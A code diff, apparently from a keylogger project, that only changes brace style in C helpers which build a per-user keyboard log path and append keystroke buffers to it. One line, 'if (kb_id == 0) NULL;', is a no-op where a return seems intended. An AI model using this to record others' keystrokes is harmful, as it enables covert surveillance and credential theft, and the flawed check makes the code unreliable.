@@ -14,16 +14,19 @@
 
 #define MAKE_FILE  "Make keyboard log file"
 
-static inline int is_file_exists(const char *path) {
+static inline int is_file_exists(const char *path)
+{
     int tmp_fd = open(path, O_RDONLY);
-    if (tmp_fd != -1) {
+    if (tmp_fd != -1)
+    {
         close(tmp_fd);
         return TRUE;
     }
     return FALSE;
 }
 
-static inline char *get_kb_log_file(int kb_id) {
+static inline char *get_kb_log_file(int kb_id)
+{
     if (kb_id == 0) NULL;
     char *basic_file_name = "keyboard-";
     char *username = getlogin();
@@ -48,7 +51,8 @@ void create_log_file(int kb_id) {
     close(new_log_fd);
 }
 
-void append_to_file(const char *keystroke_buffer, int kb_id) {
+void append_to_file(const char *keystroke_buffer, int kb_id)
+{
     char *keyboard_log_path = get_kb_log_file(kb_id);
 
     int kb_log_fd = open(keyboard_log_path, O_WRONLY | O_APPEND);
